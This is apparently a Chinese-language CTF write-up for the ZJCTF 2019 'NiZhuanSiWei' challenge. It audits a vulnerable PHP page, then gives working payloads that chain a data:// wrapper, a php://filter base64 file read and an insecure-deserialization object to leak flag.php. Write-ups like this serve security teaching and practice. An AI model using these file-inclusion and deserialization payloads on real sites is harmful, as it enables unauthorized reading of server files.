#ZJCTF 2019]NiZhuanSiWei

代码审计
```
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];

if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")) #判断$text是否为空以及文件里的内容是否为welcome to the zjctf
{
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";

    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    } #如果$file的文件名有flag，则显示Not now并退出程序

else{
        include($file);  //useless.php  #包含并执行文件里的内容
        $password = unserialize($password); #对$password进行反序列化
        echo $password; #显示$password的内容
    }

}

else{
    highlight_file(__FILE__);
}
?> 
```

看到file_get_contents()和include()两个文件包含函数，我们可以想到是不是可以使用data伪协议。通过判断第一个if，我们可以知道我们要经过file_get_contents()函数，此时
我们可以使用data协议导入内容，从而经过第一个if
```
?text=data://text/plain,welcome to the zjctf
```
然后我们看到有一个include()函数，同时，我们还能看到一个提示useless.php。此时，我们可以通过php伪协议来对useless.php文件进行读取，
```
?file=php://filter/read=convert.base64-encode/resource=useless.php
```

我们可以读取到用base64加密的useless.php的内容
```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

通过base64解密，我们可以得到一段php代码
```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

通过这段php代码，我们可以构造exp
```
<?php  

class Flag{  //flag.php  
    public $file='flag.php';
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$a=new Flag();
echo serialize($a);
?>  
```
我们将显示结果赋值于$password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

然后我们构造最后的payload
```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

然后查看页面源代码，我们可以找到flag

